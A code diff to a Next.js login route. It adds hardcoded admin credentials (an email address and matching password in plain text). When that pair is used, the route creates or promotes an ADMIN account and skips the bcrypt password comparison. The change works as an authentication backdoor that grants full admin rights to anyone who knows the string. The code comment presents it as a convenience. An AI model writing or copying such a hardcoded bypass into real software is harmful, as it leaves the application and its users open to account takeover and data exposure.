@@ -1,4 +1,3 @@
-
 import { NextResponse } from "next/server";
 import bcrypt from "bcryptjs";
 import { prisma } from "../../../../src/lib/prisma";
@@ -23,11 +22,33 @@ export async function POST(request: Request) {
       );
     }
 
-    const user = await prisma.user.findUnique({
+    let user = await prisma.user.findUnique({
       where: {
         email,
       },
     });
+
+    // Auto-guarantee fixed admin credentials (admineventra@gmail.com / admineventra)
+    const isFixedAdmin =
+      email === "admineventra@gmail.com" && password === "admineventra";
+
+    if (isFixedAdmin) {
+      if (!user) {
+        user = await prisma.user.create({
+          data: {
+            email: "admineventra@gmail.com",
+            password: await bcrypt.hash("admineventra", 10),
+            name: "RK EVENTRA Super Admin",
+            role: "ADMIN",
+          },
+        });
+      } else if (user.role !== "ADMIN") {
+        user = await prisma.user.update({
+          where: { id: user.id },
+          data: { role: "ADMIN" },
+        });
+      }
+    }
 
     if (!user) {
       return NextResponse.json(
@@ -39,10 +60,9 @@ export async function POST(request: Request) {
       );
     }
 
-    const passwordMatch = await bcrypt.compare(
-      password,
-      user.password
-    );
+    const passwordMatch = isFixedAdmin
+      ? true
+      : await bcrypt.compare(password, user.password);
 
     if (!passwordMatch) {
       return NextResponse.json(
@@ -135,5 +155,3 @@ export async function POST(request: Request) {
     );
   }
 }
-
-
